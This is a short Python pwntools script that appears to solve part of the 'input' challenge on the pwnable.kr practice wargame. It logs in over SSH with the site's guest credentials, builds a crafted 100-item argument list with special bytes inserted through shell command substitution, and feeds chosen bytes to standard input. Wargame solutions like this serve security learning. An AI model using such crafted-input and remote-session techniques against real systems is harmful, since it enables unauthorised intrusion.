from pwn import *

session = ssh(host='pwnable.kr', user='input2', port=2222, password='guest')
io = session.process('/bin/bash', env={"PS1":""})
# argv
args = ['A'] * 100
args[0] = './input'
args[ord('A')] = "''"
args[ord('B')] = "\"$(printf '\\x20\\x0a\\x0d')\""
io.sendline('{} 2<&0'.format(' '.join(args)))

#stdio
io.send('\x00\x0a\x02\xff')
io.send('\x00\x0a\x02\xff')

print(io.recvrepeat(1).decode())
